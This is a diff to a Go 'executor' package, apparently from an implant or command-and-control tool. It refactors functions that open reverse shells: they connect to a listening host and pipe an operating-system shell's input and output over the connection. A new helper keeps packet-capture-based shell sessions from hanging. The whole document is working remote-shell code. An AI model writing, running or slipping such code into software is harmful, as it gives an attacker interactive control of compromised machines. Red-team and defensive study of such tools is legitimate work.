@@ -4,6 +4,7 @@ package executor
 import (
 	"context"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"os/exec"
@@ -28,16 +29,46 @@ func OpenReverseShell(ip, port string) error {
 	}
 	defer conn.Close() // Close connection when function returns
 
-	// Pipe stdin, stdout, and stderr to the connection and execute a shell
 	cmd := exec.Command(getShell())
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
-
-	// Run the command
 	cmd.Run()
-
 	return nil
+}
+
+// runPcapShell owns stdin copying so process exit does not wait for network EOF.
+func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		return fmt.Errorf("opening shell stdin: %w", err)
+	}
+	defer stdin.Close()
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("starting shell: %w", err)
+	}
+	inputDone := make(chan struct{})
+	go func() {
+		defer close(inputDone)
+		defer stdin.Close()
+		_, _ = io.Copy(stdin, conn)
+	}()
+	shellErr := cmd.Wait()
+	// Keep capture and injection running until the controller observes FIN and
+	// closes its side. Bound the wait if the peer does not respond.
+	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
+		if err := halfCloser.CloseWrite(); err != nil {
+			return fmt.Errorf("closing shell output: %w", err)
+		}
+		_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+		select {
+		case <-inputDone:
+		case <-time.After(2 * time.Second):
+		}
+	}
+	return shellErr
 }
 
 // OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
@@ -79,14 +110,5 @@ func OpenPcapReverseShell(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	// Pipe stdin, stdout, and stderr to the connection and execute a shell
-	cmd := exec.Command(getShell())
-	cmd.Stdin = conn
-	cmd.Stdout = conn
-	cmd.Stderr = conn
-
-	// Run the command
-	cmd.Run()
-
-	return nil
+	return runPcapShell(exec.Command(getShell()), conn)
 }
